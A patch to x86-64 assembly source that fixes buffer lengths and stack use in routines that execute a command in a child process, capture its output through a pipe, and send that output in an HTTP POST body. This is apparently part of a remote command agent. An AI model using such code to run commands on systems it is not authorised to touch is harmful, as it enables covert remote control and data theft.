@@ -216,7 +216,7 @@ fn_clean_buffer:
 ; Parameters:
 ;   rdi - address to buffer 1, destination buffer
 ;   rsi - address to buffer 2, source buffer
-;   rdx - length of buffer 1
+;   rdx - length of buffer 2
 fn_buffer_copy:
     push rbp
     mov rbp, rsp
@@ -260,8 +260,9 @@ fn_make_pipe:
 fn_itoa:
     push rbp
     mov rbp, rsp
-    sub rsp, 0x8                ; Stackframe
+    sub rsp, 0x18                ; Stackframe
     push rbx
+    push r9
 
     lea rbx, [ascii_post_cl_number]     ; Point to the result buffer
     add rbx, 20                         ; Start from the end of the buffer
@@ -294,6 +295,7 @@ fn_itoa:
     movzx rdx, byte [ascii_post_cl_decimal_cnt] ; Number of characters
     syscall
 
+    pop r9
     pop rbx
     mov rsp, rbp
     pop rbp
@@ -305,10 +307,31 @@ fn_server_callback:
     mov rbp, rsp
     sub rsp, 0x8                ; Stackframe
 
-    ; Copy blank line to the end of the tx buffer
+    ; Copy POST message to tx_buffer
     lea rdi, [tx_buffer]
-    add rdi, [tx_buffer_length]
-    sub rdi, 0x4
+    lea rsi, [http_POST_msg]
+    movzx rdx, byte [http_POST_msg_len]
+    call fn_buffer_copy
+    
+    ; Copy content length ascii number to tx_buffer
+    lea rdi, [tx_buffer]
+    movzx rax, byte [http_POST_msg_len]
+    add rdi, rax
+    ; Here is the weird conversion
+    lea rsi, [ascii_post_cl_number]
+    mov rax, 20
+    movzx rcx, byte [ascii_post_cl_decimal_cnt]
+    sub rax, rcx
+    add rsi, rax
+    movzx rdx, byte [ascii_post_cl_decimal_cnt]
+    call fn_buffer_copy
+
+    ; Copy blank lines to tx_buffer
+    lea rdi, [tx_buffer]
+    movzx rax, byte [http_POST_msg_len]
+    movzx rcx, byte [ascii_post_cl_decimal_cnt]
+    add rax, rcx
+    add rdi, rax
     lea rsi, [blank_line]
     mov rdx, 0x4
     call fn_buffer_copy
@@ -368,28 +391,30 @@ fn_exec_cmd:
 
     mov rdx, qword [rsp+8]      ; Copy number of bytes available from stack into rdx
 
+    mov r9, rdx                 ; Save number of bytes available
+    mov r10, r9                 ; Save number of bytes available
     ; Convert hex to ASCII
     mov rdi, rdx
     call fn_itoa
 
     ; Accomodate POST message
-    mov r9, rdx                                     ; Command output length
-    add r9b, byte [http_POST_msg_len]                     ; Add POST message length to the buffer length
-    add r9b, byte [ascii_post_cl_decimal_cnt]             ; Add the number of decimal digits to the buffer length
+    ;mov r9, rdx                                     ; Command output length
+    add r9b, byte [http_POST_msg_len]               ; Add POST message length to the buffer length
+    add r9b, byte [ascii_post_cl_decimal_cnt]       ; Add the number of decimal digits to the buffer length
     add r9, 0x4                                     ; Blank line length
     mov qword [tx_buffer_length], r9
 
-    sub r9, 0x4                                     ; Configure it for reading below
+    sub r9, r10                                     ; Write at correct position
 
     ; Read bytes from pipe with offset to tx_buffer to accomodate POST message
     xor rax, rax                                    ; read syscall
-    mov edi, dword [pipe_fd]                      ; pipe_fd[0]
+    mov edi, dword [pipe_fd]                        ; pipe_fd[0]
     ; Load address of transmit buffer with offset
     lea rsi, [tx_buffer]
     add rsi, r9
-    ; byte count already in rdx
+    mov rdx, r10                                    ; Byte count in rdx
     syscall
-
+ 
     ; Jump to return
     jmp .return
 .child_process_branch:
@@ -427,7 +452,7 @@ fn_exec_cmd:
     mov rdx, 0x0                ; char *envp
     syscall
 
-    ; Exit cleanly now
+    ; Shouldn't be here
     call fn_exit_clean
 
 .return:
